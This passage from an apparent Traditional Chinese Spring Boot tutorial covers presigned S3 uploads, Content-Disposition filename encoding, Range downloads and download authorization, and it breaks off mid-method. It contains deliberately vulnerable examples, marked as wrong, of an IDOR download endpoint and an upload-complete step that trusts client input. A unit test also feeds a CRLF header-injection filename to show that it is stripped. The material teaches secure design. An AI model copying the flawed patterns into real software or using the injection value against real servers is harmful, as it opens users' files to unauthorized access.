    public ResponseEntity<CallRecordingResponse> complete(
            @PathVariable("uploadId") @Pattern(regexp = "^up_[0-9a-z]{26}$") String uploadId,
            @RequestBody @Valid CompleteUploadRequest request,
            @CurrentActor Actor actor) {

        var recording = uploadService.complete(uploadId, request.etag(), actor);

        return ResponseEntity
                .created(URI.create("/orders/%s/call-recordings/%s"
                        .formatted(recording.orderId(), recording.recordingId())))
                .body(new CallRecordingResponse(
                        recording.recordingId(), recording.displayName(),
                        recording.sizeBytes(), recording.durationSeconds(),
                        recording.createdAt()));
    }

    /** 查詢狀態（客戶端 PUT 失敗後可以問「我這個許可還有效嗎」）。 */
    @GetMapping("/{uploadId}")
    public UploadIntentStatusResponse status(
            @PathVariable("uploadId") @Pattern(regexp = "^up_[0-9a-z]{26}$") String uploadId,
            @CurrentActor Actor actor) {
        var intent = uploadService.getIntent(uploadId, actor);
        return new UploadIntentStatusResponse(
                intent.uploadId(), intent.status().name(), intent.expiresAt());
    }

    // ── DTO ──────────────────────────────────────────────────────

    public record CreateUploadIntentRequest(

        @NotBlank @Pattern(regexp = "^ord_[0-9A-Za-z]{1,32}$")
        String orderId,

        /**
         * 客戶端宣告的檔名。
         *
         * <p>⚠️ 和 multipart 一樣不可信 —— 只用來當 displayName（經 SafeFilename 清理）。
         * 儲存 key 由伺服器產生。
         */
        @NotBlank @Size(max = 255)
        String filename,

        /**
         * 客戶端宣告的 content type。
         *
         * <p>★ 這裡的白名單有雙重作用：
         * (a) 拒絕我們不接受的型別
         * (b) <b>它會被寫進預簽名 URL 的簽章</b> ——
         *     客戶端 PUT 時如果送不同的 Content-Type，S3 會拒絕（403）。
         *     這是「客戶端無法繞過」的部分。
         */
        @NotBlank @Pattern(regexp = "^(audio/mpeg|audio/mp4|audio/wav)$",
                           message = "只接受 audio/mpeg、audio/mp4、audio/wav")
        String contentType,

        /**
         * 客戶端宣告的大小。
         *
         * <p>★ 這個值也會進簽章（S3 的 {@code content-length-range} 條件），
         * 所以客戶端傳超過宣告大小的內容會被 S3 拒絕。
         */
        @NotNull @Min(1) @Max(2_147_483_648L)     // 2 GB
        Long sizeBytes,

        /**
         * 內容的 SHA-256（base64）。
         *
         * <p>★ 選填但強烈建議：S3 會驗證它（{@code x-amz-checksum-sha256}），
         * 所以「上傳過程中資料損毀」會在 S3 端被偵測，而不是等我們讀壞檔案。
         */
        @Pattern(regexp = "^[A-Za-z0-9+/]{43}=$", message = "必須是 base64 編碼的 SHA-256")
        String sha256
    ) {}

    public record CompleteUploadRequest(
        /** S3 在 PUT 成功時回的 ETag —— 用來確認「客戶端真的上傳完了」。 */
        @NotBlank @Size(max = 128) String etag
    ) {}

    public record UploadIntentResponse(
        String uploadId, String uploadUrl, String method,
        Map<String, String> requiredHeaders, Instant expiresAt) {}

    public record UploadIntentStatusResponse(
        String uploadId, String status, Instant expiresAt) {}

    public record CallRecordingResponse(
        String recordingId, String displayName, long sizeBytes,
        Integer durationSeconds, Instant createdAt) {}
}
```

### 5.7.3 步驟 ③ 的驗證：絕不能相信客戶端說的話

**這是預簽名 URL 最容易被做錯的地方。**

```java
    // 🔴 錯誤的 complete 實作
    public CallRecording complete(String uploadId, String etag, Actor actor) {
        UploadIntent intent = repository.find(uploadId);
        return recordingRepository.save(new CallRecording(
                intent.orderId(),
                intent.storageKey(),
                intent.declaredSizeBytes()));      // 🔴 客戶端宣告的大小
    }
```

**攻擊**：宣告 `sizeBytes: 1`，實際上傳 2 GB。
`content-length-range` 的簽章條件會擋住…**如果你設了的話**。
而即使 S3 擋了，資料庫裡也可能已經記著「1 byte」。

**更根本的問題**：**你無法確定客戶端真的上傳了。**
它可以直接呼叫步驟 ③ 而完全跳過步驟 ②。
那你的資料庫裡就有一筆「指向不存在的物件」的紀錄。

```java
package example.shop.common.upload.service;

import example.shop.common.error.ErrorCode;
import example.shop.common.upload.SafeFilename;
import example.shop.common.upload.UploadRejectedException;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**
 * 預簽名上傳的完成流程（實作放在 05-service，這裡是 Web 層需要理解的契約）。
 */
public class PresignedUploadServiceImpl implements PresignedUploadService {

    private static final Logger log =
            LoggerFactory.getLogger(PresignedUploadServiceImpl.class);

    @Override
    public CallRecordingResult complete(String uploadId, String clientEtag, Actor actor) {

        UploadIntent intent = intentRepository.findById(uploadId)
                .orElseThrow(() -> new ResourceNotFoundException("UploadIntent", uploadId));

        // ── 驗證 1：所有權 ★ ─────────────────────────────────────
        // ⚠️ 沒有這一條就是 IDOR：任何人都能「完成」別人的上傳，
        //    把別人的錄音掛到自己的訂單上。
        if (!intent.createdBy().equals(actor.id()) && !actor.isInternal()) {
            throw new ResourceNotFoundException("UploadIntent", uploadId);   // ★ 回 404 不是 403
        }

        // ── 驗證 2：狀態 ────────────────────────────────────────
        if (intent.status() == UploadIntentStatus.COMPLETED) {
            // ★ 冪等：重複呼叫回同樣的結果，而不是報錯
            return existingResult(intent);
        }
        if (intent.status() == UploadIntentStatus.EXPIRED
                || intent.expiresAt().isBefore(Instant.now())) {
            throw new UploadRejectedException(ErrorCode.RESOURCE_GONE,
                    "The upload intent has expired.",
                    Map.of("expiresAt", intent.expiresAt(),
                           "hint", "請重新申請一個上傳許可。"));
        }

        // ── 驗證 3：物件真的存在 ★★★ ────────────────────────────
        // 這是最重要的一步：向物件儲存查詢 metadata。
        // 它同時驗證了「有上傳」與「大小是多少」。
        ObjectMetadata actual = objectStorage.headObject(intent.storageKey())
                .orElseThrow(() -> new UploadRejectedException(
                        ErrorCode.VALIDATION_FAILED,
                        "No object was found at the expected location.",
                        Map.of("hint", "請先完成檔案上傳（步驟 2）再呼叫此端點。")));

        // ── 驗證 4：ETag 一致 ───────────────────────────────────
        // ★ 這一條的價值：它證明「呼叫 complete 的人知道上傳結果」，
        //   排除了「攻擊者猜到 uploadId 並搶先 complete」的競態。
        if (!normalizeEtag(actual.etag()).equals(normalizeEtag(clientEtag))) {
            log.warn("complete 的 ETag 不符 uploadId={} client={} actual={}",
                     uploadId, clientEtag, actual.etag());
            throw new UploadRejectedException(ErrorCode.VALIDATION_FAILED,
                    "The provided ETag does not match the stored object.",
                    Map.of("hint", "請使用 PUT 回應中的 ETag。"));
        }

        // ── 驗證 5：大小 ★ ──────────────────────────────────────
        // 用「實際大小」而不是宣告的
        if (actual.sizeBytes() > MAX_RECORDING_BYTES) {
            objectStorage.delete(intent.storageKey());        // ★ 清掉違規的物件
            throw new UploadRejectedException(ErrorCode.PAYLOAD_TOO_LARGE,
                    "Uploaded object is %d bytes, exceeding the limit."
                            .formatted(actual.sizeBytes()),
                    Map.of("maxBytes", MAX_RECORDING_BYTES,
                           "actualBytes", actual.sizeBytes()));
        }
        if (actual.sizeBytes() != intent.declaredSizeBytes()) {
            // ⚠️ 不一致不一定是攻擊（客戶端可能算錯），但值得記錄
            log.info("上傳大小與宣告不符 uploadId={} declared={} actual={}",
                     uploadId, intent.declaredSizeBytes(), actual.sizeBytes());
        }

        // ── 驗證 6：內容型別 ★ ──────────────────────────────────
        // 從物件的前幾個 byte 判定（和 multipart 一樣，5.5.2）
        byte[] head = objectStorage.readRange(intent.storageKey(), 0, 64);
        if (!isAcceptedAudio(head)) {
            objectStorage.delete(intent.storageKey());
            throw new UploadRejectedException(ErrorCode.UNSUPPORTED_MEDIA_TYPE,
                    "The uploaded object is not a supported audio file.",
                    Map.of("hint", "只接受 MP3、M4A、WAV。"));
        }

        // ── 搬到正式位置 ★ ──────────────────────────────────────
        // ★ 為什麼上傳到 tmp/ 再搬：
        //   (a) 未完成的上傳不會出現在正式的 prefix 下（列表乾淨）
        //   (b) tmp/ 可以設 S3 lifecycle rule「7 天後自動刪除」→ 廢棄的上傳自動清理
        //   (c) 搬移在 S3 是 server-side copy，不經過你的頻寬
        String finalKey = StorageKeys.generate("call-recordings",
                extensionOf(actual.contentType()));
        objectStorage.copy(intent.storageKey(), finalKey);
        objectStorage.delete(intent.storageKey());

        // ── 寫資料庫（同一個交易）────────────────────────────────
        var recording = recordingRepository.save(new CallRecording(
                intent.orderId(),
                finalKey,
                SafeFilename.sanitize(intent.declaredFilename(), extensionOf(actual.contentType())),
                actual.sizeBytes(),                     // ★ 實際大小
                actual.contentType(),
                actor.id()));
        intentRepository.markCompleted(uploadId, finalKey);

        // 非同步：算時長、掃毒、轉檔
        eventPublisher.publishEvent(new CallRecordingUploadedEvent(recording.recordingId()));

        return toResult(recording);
    }

    /** S3 的 ETag 有引號，某些 SDK 會去掉 —— 比較前正規化。 */
    private static String normalizeEtag(String etag) {
        if (etag == null) return "";
        String s = etag.trim();
        if (s.startsWith("\"") && s.endsWith("\"") && s.length() >= 2) {
            s = s.substring(1, s.length() - 1);
        }
        return s.toLowerCase();
    }
}
```

**六道驗證的目的對照**：

| # | 驗證 | 沒有它會怎樣 |
|---|---|---|
| 1 | 所有權 | IDOR：把別人的錄音掛到自己的訂單 |
| 2 | 狀態 | 過期的許可仍可完成；重複呼叫產生兩筆紀錄 |
| 3 | **物件存在** | 資料庫有紀錄但檔案不存在 → 下載時 500 |
| 4 | ETag | 攻擊者猜 uploadId 搶先 complete |
| 5 | 大小 | 儲存成本失控；宣告 1 byte 實際 2 GB |
| 6 | 內容型別 | 上傳 exe 冒充 mp3 |

⚠️ **一個常被忽略的清理需求**：沒有走到步驟 ③ 的 `tmp/` 物件。

```json
{
  "Rules": [
    {
      "ID": "expire-incomplete-uploads",
      "Status": "Enabled",
      "Filter": { "Prefix": "tmp/" },
      "Expiration": { "Days": 7 }
    },
    {
      "ID": "abort-incomplete-multipart",
      "Status": "Enabled",
      "AbortIncompleteMultipartUpload": { "DaysAfterInitiation": 1 }
    }
  ]
}
```

⚠️ **第二條規則（`AbortIncompleteMultipartUpload`）常被漏掉，而它會花很多錢**：
S3 的 multipart upload 如果沒有 complete 也沒有 abort，**已上傳的 part 會一直計費**，
而且**不會出現在 bucket 的物件列表裡**（所以你在 Console 看到「這個 bucket 是空的」，
帳單卻是幾百美金）。

---

## 5.8 檔案下載

### 5.8.1 `Content-Disposition` 的檔名編碼 ★

**問題**：HTTP header 的值在 RFC 7230 裡只允許 US-ASCII。
`Content-Disposition: attachment; filename="訂單明細.csv"` 的中文要怎麼放？

**三種寫法與它們的支援度**：

```http
# 寫法 A：直接放 UTF-8 位元組（違反規格，但很多瀏覽器接受）
Content-Disposition: attachment; filename="訂單明細.csv"

# 寫法 B：RFC 5987 / 6266 的 filename*（正確做法）
Content-Disposition: attachment; filename*=UTF-8''%E8%A8%82%E5%96%AE%E6%98%8E%E7%B4%B0.csv

# 寫法 C：兩個都給（★ 最佳實務）
Content-Disposition: attachment; filename="order-details.csv"; filename*=UTF-8''%E8%A8%82%E5%96%AE%E6%98%8E%E7%B4%B0.csv
```

| 寫法 | 現代瀏覽器 | 舊 HTTP client（curl -O、某些 SDK） | 規格 |
|---|---|---|---|
| A | ⚠️ 多數可以，但依 server 的編碼行為而異 | 🔴 亂碼 | ❌ 違反 RFC 7230 |
| B | ✅ 全部支援 | 🔴 有些看不懂 `filename*`，於是**完全沒有檔名** | ✅ RFC 6266 |
| C | ✅ 用 `filename*` | ✅ 用 `filename`（ASCII 版） | ✅ RFC 6266 §4.3：兩者都在時，`filename*` 優先 |

⚠️ **Spring 的 `ContentDisposition` 只會產生 B，不會產生 C。**

```java
// Spring 的行為
ContentDisposition.attachment()
        .filename("訂單明細.csv", StandardCharsets.UTF_8)
        .build()
        .toString();
// → attachment; filename*=UTF-8''%E8%A8%82%E5%96%AE%E6%98%8E%E7%B4%B0.csv
//   ★ 沒有 ASCII 的 filename= 後備

ContentDisposition.attachment()
        .filename("訂單明細.csv")                 // 沒給 charset
        .build()
        .toString();
// → attachment; filename="訂單明細.csv"
//   ★ 這是寫法 A —— 而 Spring 會把它以 ISO-8859-1 寫進 header → 亂碼
```

**所以要自己組**：

```java
package example.shop.common.web;

import org.springframework.http.ContentDisposition;
import org.springframework.http.HttpHeaders;

import java.nio.charset.StandardCharsets;
import java.text.Normalizer;

/**
 * {@code Content-Disposition} 的正確組法（RFC 6266）。
 *
 * <p>★ 為什麼不直接用 Spring 的 {@link ContentDisposition}：
 * 它只產生 {@code filename*}（無 ASCII 後備）或只產生 {@code filename}
 * （非 ASCII 會亂碼）。RFC 6266 §4.3 建議<b>兩者都給</b>，
 * 這樣現代瀏覽器用 {@code filename*}，舊 client 用 {@code filename}。
 */
public final class ContentDispositions {

    /**
     * @param inline   true = 瀏覽器內顯示（圖片預覽）；false = 下載
     * @param filename 顯示檔名（應該已經過 {@code SafeFilename.sanitize}）
     */
    public static String build(boolean inline, String filename) {
        String type = inline ? "inline" : "attachment";
        String ascii = toAsciiFallback(filename);
        String encoded = percentEncode(filename);

        // ⚠️ 順序：filename 在前、filename* 在後。
        //   RFC 6266 說「兩者都在時用 filename*」，但有些解析器是「最後一個贏」，
        //   把 filename* 放後面對兩種解析器都正確。
        return "%s; filename=\"%s\"; filename*=UTF-8''%s".formatted(type, ascii, encoded);
    }

    public static void apply(HttpHeaders headers, boolean inline, String filename) {
        headers.set(HttpHeaders.CONTENT_DISPOSITION, build(inline, filename));
    }

    /**
     * ASCII 後備檔名。
     *
     * <p>做法：
     * <ol>
     *   <li>Unicode 正規化成 NFD，然後移除組合記號 → {@code café} 變 {@code cafe}。</li>
     *   <li>剩下的非 ASCII（中文、日文）換成 {@code _}。</li>
     *   <li>移除 {@code "} 與 {@code \} —— 它們會破壞 quoted-string。</li>
     *   <li>移除控制字元 —— <b>它們會造成 header 注入</b>。</li>
     * </ol>
     *
     * <p>⚠️ 第 4 步是安全關鍵：{@code filename} 含 {@code \r\n} 會讓攻擊者
     * 插入任意 header（例如 {@code Set-Cookie}）。
     * Tomcat 較新的版本會拒絕含控制字元的 header 值（拋 {@code IllegalArgumentException}），
     * <b>但不要依賴容器的防護</b>。
     */
    static String toAsciiFallback(String filename) {
        if (filename == null || filename.isBlank()) return "download";

        String decomposed = Normalizer.normalize(filename, Normalizer.Form.NFD);
        StringBuilder out = new StringBuilder(decomposed.length());
        for (int i = 0; i < decomposed.length(); i++) {
            char c = decomposed.charAt(i);
            if (c == '"' || c == '\\' || c < 0x20 || c == 0x7F) {
                continue;                                    // 直接丟掉危險字元
            }
            if (Character.getType(c) == Character.NON_SPACING_MARK) {
                continue;                                    // é 的重音符號
            }
            out.append(c <= 0x7F ? c : '_');                 // 非 ASCII → _
        }
        // 把連續的 _ 收成一個，看起來比較不糟
        String result = out.toString().replaceAll("_{2,}", "_").trim();
        return result.isEmpty() || "_".equals(result) ? "download" : result;
    }

    /**
     * RFC 5987 的 ext-value 百分比編碼。
     *
     * <p>⚠️ 不能用 {@code URLEncoder.encode()}：它是
     * {@code application/x-www-form-urlencoded} 的規則，會把空白編成 {@code +}，
     * 而 RFC 5987 要求 {@code %20}。
     */
    static String percentEncode(String s) {
        if (s == null) return "download";
        byte[] bytes = s.getBytes(StandardCharsets.UTF_8);
        StringBuilder out = new StringBuilder(bytes.length * 3);
        for (byte b : bytes) {
            int v = b & 0xFF;
            // RFC 5987 的 attr-char：ALPHA / DIGIT / !#$&+-.^_`|~
            boolean safe = (v >= 'a' && v <= 'z') || (v >= 'A' && v <= 'Z')
                    || (v >= '0' && v <= '9')
                    || v == '!' || v == '#' || v == '$' || v == '&'
                    || v == '+' || v == '-' || v == '.' || v == '^'
                    || v == '_' || v == '`' || v == '|' || v == '~';
            if (safe) {
                out.append((char) v);
            } else {
                out.append('%').append(String.format("%02X", v));
            }
        }
        return out.toString();
    }

    private ContentDispositions() {}
}
```

**測試**：

```java
class ContentDispositionsTest {

    @Test
    @DisplayName("中文檔名同時產生 ASCII 後備與 filename*")
    void 中文() {
        String header = ContentDispositions.build(false, "訂單明細.csv");
        assertThat(header)
                .isEqualTo("attachment; filename=\"_.csv\"; "
                         + "filename*=UTF-8''%E8%A8%82%E5%96%AE%E6%98%8E%E7%B4%B0.csv");
    }

    @Test
    @DisplayName("重音符號在 ASCII 後備裡被去掉而不是變成底線")
    void 重音() {
        assertThat(ContentDispositions.toAsciiFallback("café-menu.pdf"))
                .isEqualTo("cafe-menu.pdf");
    }

    @Test
    @DisplayName("空白編成 %20 而不是 +")
    void 空白() {
        assertThat(ContentDispositions.percentEncode("my file.csv"))
                .isEqualTo("my%20file.csv");
    }

    @Test
    @DisplayName("header 注入被阻止")
    void header注入() {
        String header = ContentDispositions.build(false,
                "report\r\nSet-Cookie: admin=true.csv");
        assertThat(header).doesNotContain("\r").doesNotContain("\n");
        // filename* 裡的 CR LF 被百分比編碼成 %0D%0A —— 那是安全的（不會被當 header 分隔）
        assertThat(header).contains("%0D%0A");
    }

    @Test
    @DisplayName("引號被移除，不會破壞 quoted-string")
    void 引號() {
        assertThat(ContentDispositions.build(false, "a\"b.csv"))
                .contains("filename=\"ab.csv\"");
    }

    @Test
    @DisplayName("全非 ASCII 的檔名有安全的後備")
    void 全中文() {
        assertThat(ContentDispositions.toAsciiFallback("訂單.csv"))
                .isEqualTo("_.csv");
    }
}
```

⚠️ **`inline` vs `attachment` 的安全含意**：

| | 行為 | 風險 |
|---|---|---|
| `attachment` | 一律下載 | ✅ 安全（瀏覽器不會渲染它） |
| `inline` | 瀏覽器可能直接顯示 | 🔴 **如果內容是 HTML / SVG → 在你的網域上執行 script**（5.5.5） |

**規則**：使用者上傳的內容一律 `attachment`，
除非它已經被二次編碼成確定安全的格式（重新編碼過的 JPEG / PNG）。

### 5.8.2 `ResponseEntity<Resource>` 的完整實作

```java
package example.shop.order.web;

import example.shop.common.upload.UserContentHeaders;
import example.shop.common.upload.UploadProperties;
import example.shop.common.web.ContentDispositions;
import example.shop.common.web.CurrentActor;
import example.shop.order.domain.Actor;
import example.shop.order.service.OrderReceiptService;
import org.springframework.core.io.InputStreamResource;
import org.springframework.core.io.Resource;
import org.springframework.http.*;
import org.springframework.web.bind.annotation.*;

import java.net.URI;
import java.time.Duration;

/**
 * 訂單收據的下載。
 *
 * <p>★ 這個端點示範兩種模式並存：
 * <ul>
 *   <li><b>302 到預簽名 URL</b>（正式環境）—— 檔案不經過應用伺服器。</li>
 *   <li><b>應用程式代理</b>（本機開發、或需要嚴格稽核時）。</li>
 * </ul>
 * 由 {@code api.upload.download.proxy-through-application} 切換（5.6.3）。
 */
@RestController
@RequestMapping("/orders/{orderId}/receipts")
public class OrderReceiptController {

    private final OrderReceiptService receiptService;
    private final UploadProperties properties;

    public OrderReceiptController(OrderReceiptService receiptService,
                                  UploadProperties properties) {
        this.receiptService = receiptService;
        this.properties = properties;
    }

    /**
     * 下載一份收據。
     *
     * <p>回應可能是：
     * <ul>
     *   <li>{@code 200} + 檔案內容（代理模式）</li>
     *   <li>{@code 206} + 部分內容（代理模式 + Range 請求，5.8.3）</li>
     *   <li>{@code 302} + {@code Location} 指向預簽名 URL（轉址模式）</li>
     *   <li>{@code 202} 掃毒還沒完成（5.5.6）</li>
     *   <li>{@code 404} 不存在或無權存取</li>
     * </ul>
     */
    @GetMapping("/{receiptId}")
    public ResponseEntity<Resource> download(
            @PathVariable("orderId") String orderId,
            @PathVariable("receiptId") String receiptId,
            @RequestParam(value = "disposition", defaultValue = "attachment")
                    String disposition,
            @CurrentActor Actor actor) {

        // ★ 授權在 Service（它知道「誰能看哪張訂單的收據」）。
        //   ⚠️ 這一步絕對不能省 —— 見 5.8.5 的 IDOR 討論。
        var receipt = receiptService.getDownloadable(orderId, receiptId, actor);

        // ── 轉址模式 ─────────────────────────────────────────────
        if (!properties.download().proxyThroughApplication()) {
            URI presigned = receiptService.presignedUrl(
                    receipt, properties.download().presignedUrlTtl());
            return ResponseEntity
                    .status(HttpStatus.FOUND)                     // 302
                    .location(presigned)
                    // ★ 302 也要 no-store：Location 裡有簽章，不能被快取
                    .cacheControl(CacheControl.noStore())
                    .build();
        }

        // ── 代理模式 ─────────────────────────────────────────────
        HttpHeaders headers = new HttpHeaders();

        headers.setContentType(MediaType.parseMediaType(receipt.contentType()));
        headers.setContentLength(receipt.sizeBytes());

        // ★ inline 只允許已知安全的型別
        boolean inline = "inline".equals(disposition) && isSafeForInline(receipt.contentType());
        ContentDispositions.apply(headers, inline, receipt.displayName());

        // ★ 使用者上傳的內容 → 加上完整的防護標頭（5.5.5）
        UserContentHeaders.apply(headers);

        // ★ 私有資源：只允許瀏覽器快取，不允許 CDN / 代理快取
        //   ⚠️ 如果這裡寫成 public，CDN 會把 A 客戶的收據給 B 客戶看到
        //      （03-rest-api 8.5.2 的「快取 + 授權」災難）
        headers.setCacheControl(CacheControl
                .maxAge(Duration.ofMinutes(5))
                .cachePrivate()
                .mustRevalidate());

        // ★ ETag 讓重複下載變成 304（收據內容不會變，所以用 storage key 當 ETag）
        headers.setETag("\"" + receipt.contentHash() + "\"");

        // ★ 一定要 InputStreamResource 而不是 ByteArrayResource ——
        //   後者會把整個檔案讀進記憶體
        Resource body = new InputStreamResource(receiptService.openStream(receipt));

        return new ResponseEntity<>(body, headers, HttpStatus.OK);
    }

    private static boolean isSafeForInline(String contentType) {
        // ⚠️ 刻意不含 image/svg+xml 與任何 text/html
        return "image/jpeg".equals(contentType)
                || "image/png".equals(contentType)
                || "image/webp".equals(contentType)
                || "application/pdf".equals(contentType);
    }
}
```

⚠️ **`InputStreamResource` 的三個陷阱**：

| 陷阱 | 說明 |
|---|---|
| **只能讀一次** | `Resource.getInputStream()` 每次都回同一個流。Spring 的轉換器只讀一次，所以正常情況沒問題 —— **但如果有 filter 想「重試」就會失敗** |
| **`contentLength()` 會拋例外** | `InputStreamResource.contentLength()` 的實作是「讀完整個流來數」，所以**你必須自己 `setContentLength()`**。忘記的話 Spring 會走 chunked encoding（能動，但瀏覽器無法顯示進度條） |
| **例外發生在寫回應時** | 如果 `openStream()` 成功但讀到一半失敗，回應已經 committed → 錯誤處理無效（5.9.4） |

**如果檔案很小（< 1 MB）用 `ByteArrayResource` 反而更好**：

```java
        // 小檔案：全部讀進來，這樣「讀取失敗」發生在寫回應之前
        byte[] content = receiptService.readAllBytes(receipt);      // 可能拋例外 → 走 advice
        Resource body = new ByteArrayResource(content);
        // ★ ByteArrayResource 的 contentLength() 是準的，不用自己設
```

**決策**：

| 檔案大小 | 用什麼 | 理由 |
|---|---|---|
| < 1 MB | `ByteArrayResource` | 讀取錯誤能走正常的錯誤處理；記憶體成本可忽略 |
| 1 ～ 50 MB | `InputStreamResource` + 自己設 `Content-Length` | 不佔記憶體 |
| > 50 MB | **預簽名 URL**（不要代理） | 佔用執行緒太久 |

### 5.8.3 `Range` 請求：Spring 免費送你的功能

**你不需要寫任何程式碼就有 `Range` 支援** —— 只要回傳 `Resource`。

**機制**（在 `AbstractMessageConverterMethodProcessor` 裡）：

```java
// Spring 的原始碼（簡化）
if (isResourceType(value, returnType)) {
    outputMessage.getHeaders().set(HttpHeaders.ACCEPT_RANGES, "bytes");
    if (value != null && request.getHeaders().getFirst(HttpHeaders.RANGE) != null
            && response.getStatus() == 200) {
        Resource resource = (Resource) value;
        try {
            List<HttpRange> httpRanges = request.getHeaders().getRange();
            response.setStatus(HttpStatus.PARTIAL_CONTENT.value());        // 206
            body = HttpRange.toResourceRegions(httpRanges, resource);
            targetType = RESOURCE_REGION_LIST_TYPE;
        } catch (IllegalArgumentException ex) {
            response.getHeaders().set(HttpHeaders.CONTENT_RANGE,
                    "bytes */" + resource.contentLength());
            response.setStatus(HttpStatus.REQUESTED_RANGE_NOT_SATISFIABLE.value());  // 416
        }
    }
}
```

**實測**：

```bash
# 完整下載
$ curl -i https://api.shop.example/orders/ord_1/receipts/rcp_1
HTTP/1.1 200 OK
Accept-Ranges: bytes                    ← ★ Spring 自動加的
Content-Length: 245113
Content-Type: application/pdf

# 只要前 1024 bytes
$ curl -i -H "Range: bytes=0-1023" https://api.shop.example/orders/ord_1/receipts/rcp_1
HTTP/1.1 206 Partial Content
Content-Range: bytes 0-1023/245113
Content-Length: 1024

# 最後 500 bytes
$ curl -i -H "Range: bytes=-500" …
HTTP/1.1 206 Partial Content
Content-Range: bytes 244613-245112/245113

# 超出範圍
$ curl -i -H "Range: bytes=999999-" …
HTTP/1.1 416 Range Not Satisfiable
Content-Range: bytes */245113
```

⚠️ **但有三個前提，少一個就不會動**：

| 前提 | 為什麼 |
|---|---|
| 回傳型別是 `Resource`（或 `ResponseEntity<Resource>`） | Spring 只對 `Resource` 做這件事 |
| **狀態碼是 200** | 上面的 `response.getStatus() == 200`。如果你回 `ResponseEntity.status(206)` 手動處理，Spring 就不管了 |
| **`ResourceRegionHttpMessageConverter` 有註冊** | Boot 的 `WebMvcAutoConfiguration` 預設有註冊。⚠️ 但如果你用 `@EnableWebMvc` + 自己 `configureMessageConverters()` **覆寫**了轉換器清單，就會弄掉它（06 章 6.4.5 會詳談） |

**`InputStreamResource` 的 Range 支援是「假的」** —— 這是一個重要的細節：

```java
// HttpRange.toResourceRegions() 需要 resource.contentLength()
// InputStreamResource.contentLength() 的實作：讀完整個流來數 bytes
//   → 對 500 MB 的檔案：讀 500 MB 只為了知道長度
//   → 然後流已經到底了，真正要寫的時候讀不到東西 🔴
```

**所以 Range 只在這些 `Resource` 上真的有用**：

| Resource 型別 | Range 是否可用 |
|---|---|
| `ByteArrayResource` | ✅ 完全可用（隨機存取） |
| `FileSystemResource` / `PathResource` | ✅ 完全可用（`FileChannel` 可 seek） |
| `ClassPathResource`（實體檔案） | ✅ 可用 |
| `InputStreamResource` | 🔴 **不要用**（`contentLength()` 會吃掉整個流） |
| 自訂的 S3 `Resource` | ⚠️ 要自己實作 `contentLength()`（用 `headObject`）並讓 `getInputStream()` 支援重新開啟 |

**S3 的 Range 下載該怎麼做**：**不要代理，直接轉址。**
S3 原生支援 Range，而預簽名 URL 會把 Range 請求原封不動地轉給 S3：

```java
        // ★ 影片 / 大檔一律轉址 —— 讓 S3（或 CloudFront）處理 Range，
        //   這是它們最擅長的事，而且完全不佔用你的資源
        return ResponseEntity.status(HttpStatus.FOUND)
                .location(presignedUrl)
                .cacheControl(CacheControl.noStore())
                .build();
```

### 5.8.4 代理還是轉址：決策

| 面向 | 應用程式代理 | 302 → 預簽名 URL |
|---|---|---|
| 佔用 Tomcat 執行緒 | 🔴 整個下載期間 | ✅ 只有 302 那一瞬間 |
| 頻寬成本 | 🔴 S3 → 你 → 使用者（兩倍） | ✅ S3 → 使用者 |
| Range / 續傳 | ⚠️ 要自己實作 | ✅ S3 原生 |
| CDN 加速 | ❌ 不行（每次都經過你） | ✅ 可以（CloudFront + OAC） |
| 稽核「誰下載了什麼」 | ✅ 完整（每個 byte 都經過你） | ⚠️ 只知道「誰要了連結」 |
| 連結洩漏風險 | ✅ 無 | ⚠️ **URL 被轉貼 → 在 TTL 內任何人可下載** |
| 本機開發 | ✅ 不需要 S3 | ❌ 需要 MinIO 或 mock |
| 存取控制的即時性 | ✅ 每個請求都檢查 | ⚠️ 簽發後撤銷不了（除到期） |

**shop-service 的決定**：

| 資源 | 模式 | 理由 |
|---|---|---|
| 商品圖 | **CDN 公開 URL**（不經過 API） | 公開資料，要最大快取效率 |
| 訂單收據 | **302 預簽名，TTL 5 分鐘** | 私有但不極度敏感；檔案可能幾 MB |
| 通話錄音 | **302 預簽名，TTL 2 分鐘 + 稽核紀錄** | 大檔（幾百 MB），且要記錄誰聽了 |
| 匯出的 CSV | **一次性 token + 302**（5.10.4） | 含大量個資，連結不可重複使用 |
| 發票 PDF | **應用程式代理** | 小檔（< 200 KB），且要即時檢查權限（會計可能被停權） |

⚠️ **「TTL 5 分鐘」的取捨**：

```
TTL 太長（1 小時）
  → 使用者把 URL 貼到 Slack 群組 → 一小時內全公司都能下載他的收據

TTL 太短（10 秒）
  → 手機網路慢，下載到一半 URL 過期
  → ⚠️ 注意：S3 的預簽名 URL 過期檢查是在「請求開始時」，
     一旦開始傳輸就不會中斷。所以 10 秒對「開始下載」是夠的，
     但對「使用者看到連結後才點」不夠。

5 分鐘 = 「使用者點下載按鈕後，最慢的手機也能在 5 分鐘內開始傳輸」
```

### 5.8.5 下載的授權：最常見的 IDOR

**這是檔案功能最常見的漏洞，而且經常是「上線很久才被發現」。**

```java
    // 🔴 漏洞版
    @GetMapping("/receipts/{receiptId}")
    public ResponseEntity<Resource> download(@PathVariable String receiptId) {
        Receipt receipt = receiptRepository.findById(receiptId).orElseThrow();
        return ok(storage.load(receipt.storageKey()));
    }
```

**攻擊**：`rcp_01k39w5r7qz8h2n4m6p8v0x2c4` 是 ULID —— **它是可預測的**
（時間前綴 + 隨機）。攻擊者上傳自己的收據拿到一個 ID，
就知道「同一秒建立的其他收據」的 ID 前綴，剩下的隨機部分可以嘗試。

**更常見的是根本不需要猜**：前端某個地方（HTML 註解、JS bundle、
另一個 API 的回應）洩漏了 ID。

**四個層次的防護**：

```java
package example.shop.order.service;

/**
 * 下載授權的實作要點。
 */
public class OrderReceiptServiceImpl implements OrderReceiptService {

    @Override
    public DownloadableReceipt getDownloadable(String orderId, String receiptId, Actor actor) {

        // ── 層 1：巢狀資源必須驗證父子關係 ★ ──────────────────────
        // ⚠️ 只用 receiptId 查是不夠的：URL 是 /orders/{orderId}/receipts/{receiptId}，
        //    如果不檢查 receipt.orderId == orderId，那
        //    GET /orders/我的訂單/receipts/別人的收據 就會成功。
        Receipt receipt = receiptRepository.findByIdAndOrderId(receiptId, orderId)
                .orElseThrow(() -> new ResourceNotFoundException("Receipt", receiptId));

        // ── 層 2：訂單的所有權 ★ ────────────────────────────────
        Order order = orderRepository.findById(orderId)
                .orElseThrow(() -> new ResourceNotFoundException("Order", orderId));

        boolean owner = actor.isCustomer() && order.customerId().equals(actor.id());
        boolean staff = actor.isInternal();
        if (!owner && !staff) {
